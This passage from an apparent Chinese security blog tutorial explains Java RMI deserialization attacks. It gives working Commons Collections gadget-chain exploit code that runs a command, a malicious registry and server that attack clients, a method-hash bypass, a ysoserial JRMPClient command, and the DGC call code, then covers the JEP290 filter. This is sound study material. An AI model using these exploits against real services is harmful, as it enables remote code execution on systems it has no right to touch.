class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) registry.lookup(<span class="hljs-string">&quot;remoteObj&quot;</span>);<br>        System.out.println(remoteObj.sayHello(getEvilClass()));<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>这部分就是纯纯的 Java 原生反序列化漏洞的利用过程。</p>
<h2 id="绕过-Object-类型参数"><a href="#绕过-Object-类型参数" class="headerlink" title="绕过 Object 类型参数"></a>绕过 Object 类型参数</h2><p>非得服务端有Object类型参数的远程方法才能利用的话也太鸡肋了，接下来我们尝试绕过这个限制。我们把服务端的Object类型的方法注释掉，这时候用payload去打，我们会发现unrecognized method hash 的错误。其实就是在服务端没有找到对应的调用方法。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250107130904870.png" alt="image-20250107130904870"></p>
<p>我们之前说过服务端由 <strong>UnicastServerRef</strong> 的 <code>dispatch</code> 方法来处理客户端的请求，会在 <code>hashToMethod_Map.get(op)</code> 中寻找 Client 端对应执行 Method 的 hash 值，如果找到了，则会反序列化 Client 端传来的参数，并且通过反射调用。这个 hash 实际上是一个基于方法签名的 SHA1 hash 值。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250107135350049.png" alt="image-20250107135350049"></p>
<p>而如果我们人为的修改这个 hash 使其通过一致性检查后，就会进入到 unmarshalValue 这个方法中，再如果服务端这个方法的入参类型不是基础类型的话，我们就能通畅的进行反序列化恶意对象。造成反序列化。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250109103934648.png" alt="image-20250109103934648"></p>
<p><strong>RMI 服务端需要起一个具有 Object 参数的 RMI 方法 的利用条件限制 就扩展到了 RMI 服务端只需要起一个具有不属于基础数据类型参数的 RMI 方法（比如 String 啥的）</strong></p>
<p>接下来就是想办法让我们传递的是 Server 端能找到的参数是 HelloObject 的 Method 的 hash，但是传递的参数却不是 HelloObject 而是恶意的反序列化数据（可能是 Object或其他的类）。攻击原理核心在于替换原本不是 Object 类型的参数变为 Object 类型。</p>
<p> mogwailabs 的 [PPT](<a href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides">https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides</a> Exploiting RMI Services.pdf) 中提出了以下 4 种方法：</p>
<ul>
<li>直接修改rmi底层源码</li>
<li>在运行时，添加调试器hook客户端，然后替换</li>
<li>在客户端使用Javassist工具更改字节码</li>
<li>使用代理，来替换已经序列化的对象中的参数信息</li>
</ul>
<p>并且在 PPT 中还给出了 hook 点，那就是动态代理中使用的 RemoteObjectInvocationHandler 的 <code>invokeRemoteMethod</code> 方法。</p>
<p>接下来我们尝试一下，由于是学习和测试，这里将使用最方便的 debugger 方式。Afant1 师傅使用了 Java Agent 的方式，在<a href="https://www.anquanke.com/post/id/200860">这篇文章</a>里，0c0c0f 师傅使用了流量层的替换，在<a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg">这篇文章</a>里，有兴趣的师傅请自行查看。</p>
<p>Server 端代码不变，我们在 Client 端将 Object 参数和 HelloObject 参数的 <code>sayHello</code> 方法都写上，如下：</p>
<p>我们在服务端的接口 RemoteInterface 中定义一个 <code>sayHello</code> 方法，他接收一个在 Server 端存在的 HelloObject 类作为参数。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108173025921.png" alt="image-20250108173025921"></p>
<p>Server 端代码不变，我们在 Client 端将 Object 参数和 HelloObject 参数的 <code>sayHello</code> 方法都写上，如下：</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108173118138.png" alt="image-20250108173118138"></p>
<p>调用时，依旧使用 Object 参数的 <code>sayHello</code> 方法调用。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108173151251.png" alt="image-20250108173151251"></p>
<p>在 RemoteObjectInvocationHandler 的 <code>invokeRemoteMethod</code> 方法处下断，将 Method 改为服务端存在的 HelloObject 的 Method。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108173302048.png" alt="image-20250108173302048"></p>
<p>攻击成功。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108173324455.png" alt="image-20250108173324455"></p>
<h2 id="远程加载对象（JAVA版本要比较低，利用苛刻）"><a href="#远程加载对象（JAVA版本要比较低，利用苛刻）" class="headerlink" title="远程加载对象（JAVA版本要比较低，利用苛刻）"></a>远程加载对象（JAVA版本要比较低，利用苛刻）</h2><p>感兴趣的师傅去看su18师傅的文章吧。<a href="https://su18.org/post/rmi-attack/#1-%E6%94%BB%E5%87%BB-server-%E7%AB%AF">https://su18.org/post/rmi-attack/#1-%E6%94%BB%E5%87%BB-server-%E7%AB%AF</a></p>
<h1 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h1><h2 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h2><p>在前面分析JRMP协议过程中，当Client在连接Server之前，Registry会返回给Client一些序列化数据。如果我们能够搭建恶意的Registry来模拟JRMP协议通信，返回给Client一些恶意的序列化数据，那么就可以达到攻击的效果了。</p>
<p>这里有个很严重的缺陷就是客户端必须去 lookup 指定恶意对象才行。</p>
<p>另外注意这里虽然没直接使用RemoteObjlmpl对象，但是还是需要new RemoteObjlmpl，因为继承了UnicastRemoteObject，UnicastRemoteObject中会开启网络线程，阻塞主线程，让server等待client连接。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AlreadyBoundException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;<br>        <br>        <span class="hljs-type">RemoteObjlmpl</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjlmpl</span>();<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) getEvilClass();<br><br>        <span class="hljs-comment">//使用AnnotationInvocationHandler动态代理Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, handler);<br><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br><br>        registry.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, remote);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20250106225616792.png" alt="image-20250106225616792"></p>
<h2 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h2><p>在RMI过程中，Server会把远程方法执行的结果返回给Client端，如果返回的结果是一个对象，那么这个对象会被序列化传输，并在Client端被反序列化。如果我们搭建恶意Server端，返回给Client端恶意对象，就可以达到攻击的效果。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108175353444.png" alt="image-20250108175353444"></p>
<p>实现接口，里面是一个恶意的对象。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108175436639.png" alt="image-20250108175436639"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AlreadyBoundException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">liming</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerReturnObject</span>(<span class="hljs-string">&quot;liming&quot;</span>,<span class="hljs-number">15</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        registry.bind(<span class="hljs-string">&quot;user&quot;</span>,liming);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>client调用远程方法，被成功攻击。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108175640225.png" alt="image-20250108175640225"></p>
<h2 id="远程加载对象（JAVA版本要比较低，利用苛刻）-1"><a href="#远程加载对象（JAVA版本要比较低，利用苛刻）-1" class="headerlink" title="远程加载对象（JAVA版本要比较低，利用苛刻）"></a>远程加载对象（JAVA版本要比较低，利用苛刻）</h2><p>其实无论 Server 端还是 Client 端，只要有一端配置了 <code>java.rmi.server.codebase</code>，这个属性都会跟随数据流在两端流动。所以这里也是能被攻击的。</p>
<h1 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h1><p>在上篇我们也提到过DGC。</p>
<p>RMI 定义了一个 <code>java.rmi.dgc.DGC</code> 接口，提供了两个方法 <code>dirty</code> 和 <code>clean</code>：</p>
<p>这个接口有两个实现类，分别是 <code>sun.rmi.transport.DGCImpl</code> 以及 <code>sun.rmi.transport.DGCImpl_Stub</code>，同时还定义了 <code>sun.rmi.transport.DGCImpl_Skel</code>。</p>
<p>很像 Registry、RegistryImpl、RegistryImpl_Stub、RegistryImpl_Skel，实际上不单是命名相近，处理逻辑也是类似的。通过在服务端和客户端之间传递引用，依旧是 Stub 与 Skel 之间的通信模式：Server 端启动 DGCImpl，在 Registry 端注册 DGCImpl_Stub ，Client 端获取到 DGCImpl_Stub，通过其与 Server 端通信，Server 端使用 DGCImpl_Skel 来处理。</p>
<hr>
<p>DGC 通信的处理类是 DGCImpl_Skel 的 dispatch 方法，依旧通过 Java 原生的序列化和反序列化来处理对象。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250109164957918.png" alt="image-20250109164957918"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250109165017215.png" alt="image-20250109165017215"></p>
<p>看到这里应该就明白了，伴随着 RMI 服务启动的 DGC 通信，也存在被 Java 反序列化利用的可能。我们只需要构造一个 DGC 通信并在指定的位置写入序列化后的恶意类即可。</p>
<h2 id="对JRMP中DGC操作实现的攻击利用"><a href="#对JRMP中DGC操作实现的攻击利用" class="headerlink" title="对JRMP中DGC操作实现的攻击利用"></a>对JRMP中DGC操作实现的攻击利用</h2><p>在上篇我们提到了<a href="https://sp4rks.xyz/2024/12/27/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E4%B8%93%E9%A2%98-%E6%9C%8D%E5%8A%A1%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E7%AF%87/#DGC">DGC</a>，这边我们开启一个Server，并且在CC链最终的触发处<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>处下一个断点</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250110205904116.png" alt="image-20250110205904116"></p>
<p>使用ysoserial的<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.java">exploit&#x2F;JRMPClient</a>模块。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">java -cp ysoserial.jar ysoserial.exploit.JRMPClient vps port CommonsCollecitons6 &#x27;calc.exe&#x27;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20250110205946734.png" alt="image-20250110205946734"></p>
<p>然后我们能看到这些调用栈。在1-5的地方均有POC生成序列化数据必须满足的条件。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250110210609626.png" alt="image-20250110210609626"></p>
<p>这部分我们就直接看<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.java%E7%9A%84%E9%80%BB%E8%BE%91">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.java的逻辑</a></p>
<p>其核心在于<code>makeDGCCall</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//传入目标RMI注册端（也是DGC服务端）的IP端口，以及攻击载荷的payload对象。</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">makeDGCCall</span> <span class="hljs-params">( String hostname, <span class="hljs-type">int</span> port, Object payloadObject )</span> <span class="hljs-keyword">throws</span> IOException, UnknownHostException, SocketException &#123;<br>        <span class="hljs-type">InetSocketAddress</span> <span class="hljs-variable">isa</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(hostname, port);<br>        <span class="hljs-type">Socket</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">dos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//建立一个socket通道，并为赋值</span><br>            s = SocketFactory.getDefault().createSocket(hostname, port);<br>            s.setKeepAlive(<span class="hljs-literal">true</span>);<br>            s.setTcpNoDelay(<span class="hljs-literal">true</span>);<br>           <span class="hljs-comment">//读取socket通道的数据流</span><br>            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> s.getOutputStream();<br>            dos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(os);<br>           <span class="hljs-comment">//*******开始拼接数据流*********</span><br>            <span class="hljs-comment">//以下均为特定协议格式常量，之后会说到这些数据是怎么来的</span><br>            <span class="hljs-comment">//传输魔术字符：0x4a524d49（代表协议）</span><br>            dos.writeInt(TransportConstants.Magic);<br>            <span class="hljs-comment">//传输协议版本号：2（就是版本号）</span><br>            dos.writeShort(TransportConstants.Version);<br>            <span class="hljs-comment">//传输协议类型: 0x4c (协议的种类，好像是单向传输数据，不需要TCP的ACK确认)</span><br>            dos.writeByte(TransportConstants.SingleOpProtocol);<br>           <span class="hljs-comment">//传输指令-RMI call：0x50 </span><br>            dos.write(TransportConstants.Call);<br><br>            <span class="hljs-meta">@SuppressWarnings</span> ( <span class="hljs-string">&quot;resource&quot;</span> )<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalOutputStream</span>(dos);<br>           <span class="hljs-comment">//DGC的固定读取格式</span><br>            objOut.writeLong(<span class="hljs-number">2</span>); <span class="hljs-comment">// DGC</span><br>            objOut.writeInt(<span class="hljs-number">0</span>);<br>            objOut.writeLong(<span class="hljs-number">0</span>);<br>            objOut.writeShort(<span class="hljs-number">0</span>);<br>           <span class="hljs-comment">//选取DGC服务端的分支选dirty</span><br>            objOut.writeInt(<span class="hljs-number">1</span>); <span class="hljs-comment">// dirty</span><br>            <span class="hljs-comment">//然后一个固定的hash值</span><br>            objOut.writeLong(-<span class="hljs-number">669196253586618813L</span>);<br>            <span class="hljs-comment">//我们的反序列化触发点</span><br>            objOut.writeObject(payloadObject);<br><br>            os.flush();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>根据调用栈我们在TCPTransport$ConnectionHandler.run0打个断点，可以看到这个方法读取了一个int数据：</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112115842553.png" alt="image-20250112115842553"></p>
<p>下图又读取了一个short数据，然后不相等的话就直接return了。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112115718204.png" alt="image-20250112115718204"></p>
<p>接着读取了一个byte数据，76，于是switch进入下面的case76，继而进入handleMessage方法中：</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112115514635.png" alt="image-20250112115514635"></p>
<p>我们可以看到上面的条件其实全部都是sun.rmi.transport.TransportConstants的静态属性。也解释了为什么ysoserial为什么要这样写。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112142915850.png" alt="image-20250112142915850"></p>
<p>我们接着到了handleMessages方法中，看到读取了int数据80，于是进入了switch中的分支。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112120203905.png" alt="image-20250112120203905"></p>
<p>继续跟进，到了Transport类的serviceCall(final RemoteCall call)方法。这一部分是读取了参数之后进行了校验。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112120358993.png" alt="image-20250112120358993"></p>
<p>java.rmi.server.ObjID#read，num等于2，又调用了java.rmi.server.UID，静态方法。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112144211722.png" alt="image-20250112144211722"> </p>
<p>再进入UID.read方法，可以看到连续读取了int、long、short三个数据： 全都是0</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112150134362.png" alt="image-20250112150134362"></p>
<p>回到java.rmi.server.ObjID#read</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112120753342.png" alt="image-20250112120753342"></p>
<p>所以上面执行ObjID.read()方法的过程中就是通过读取数据最终生成一个ObjID对象。而其中三个变量unique、time、count则分别代表</p>
<ul>
<li><p>服务端uid给客户端的远程对象唯一标识编号。</p>
</li>
<li><p>远程对象有效时长用的时间戳。</p>
</li>
<li><p>用于同一时间申请的统一远程对象的另一个用于区分的随机数</p>
</li>
</ul>
<p>(这部分其实是ysoserlal序列化写入的值。我们因为攻击服务端，没有去服务端获取过远程对象所以都写成0即可，不然会报错。)</p>
<p>随后和会用该ObjID对象与dgcID作比较。dgcID是一个常量，也就是说在此处此处进行了验证。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112150838692.png" alt="image-20250112150838692"></p>
<p>如上最终dgcID生成的结构就是[0:0:0, 2]。与上面执行ObjID.read()方法生成的ObjID值是一样的。</p>
<p>这也是为什么ysoserlal为什么这么写的原因。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112152611473.png" alt="image-20250112152611473"></p>
<p>接着往下看还不仍然是获取了Target对象，由于ObjID值与dgcID值相同，因此最终生成的Target对象是DGCImpl类型的，</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112125628890.png" alt="image-20250112125628890"></p>
<p>后面同样获取了Target的Dispatcher，然后使用它的dispatch方法进行分派。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112124812139.png" alt="image-20250112124812139"></p>
<p>同样的，在UnicastServerRef类中的dispatch(Remote obj, RemoteCall call)方法中读取了一个int值。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112122833174.png" alt="image-20250112122833174"></p>
<p>接着又读取了一个long值，最后的结果如图。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112152401118.png" alt="image-20250112152401118"></p>
<p> 接着进入了DGCImpl_Skel类的dispatch(Remote var1, RemoteCall var2, int var3, long var4)，那我们就很清楚了，op对应着var3，hash对应着var4。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112123213392.png" alt="image-20250112123213392"></p>
<p>因此进入switch的case1分支，这里就会对exploit&#x2F;JRMPClient发送的恶意payload进行反序列化，从而执行其中包含的任意命令。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112123420164.png" alt="image-20250112123420164"></p>
<p> 到了这里，整个DGC调用的流程也走完了，同时发送的payload中包含的命令也执行了。</p>
<h1 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h1><p>在JEP290规范之后，即JAVA版本6u141, 7u131, 8u121之后，以上攻击就不奏效了。主要针对Registrylmpl和DGClmpl，分别是sun.rmi.registry.RegistryImpl#registryFilter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ObjectInputFilter.Status <span class="hljs-title function_">registryFilter</span><span class="hljs-params">(ObjectInputFilter.FilterInfo var0)</span> &#123;<br>       <span class="hljs-keyword">if</span> (registryFilter != <span class="hljs-literal">null</span>) &#123;<br>           ObjectInputFilter.<span class="hljs-type">Status</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> registryFilter.checkInput(var0);<br>           <span class="hljs-keyword">if</span> (var1 != Status.UNDECIDED) &#123;<br>               <span class="hljs-keyword">return</span> var1;<br>           &#125;<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (var0.depth() &gt; <span class="hljs-number">20L</span>) &#123;<br>           <span class="hljs-keyword">return</span> Status.REJECTED;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-type">Class</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> var0.serialClass();<br>           <span class="hljs-keyword">if</span> (var2 != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">//白名单</span><br>               <span class="hljs-keyword">if</span> (!var2.isArray()) &#123;<br>                   <span class="hljs-keyword">return</span> String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-keyword">return</span> var0.arrayLength() &gt;= <span class="hljs-number">0L</span> &amp;&amp; var0.arrayLength() &gt; <span class="hljs-number">1000000L</span> ? Status.REJECTED : Status.UNDECIDED;<br>               &#125;<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">return</span> Status.UNDECIDED;<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>

<p>sun.rmi.transport.DGCImpl#checkInput</p>
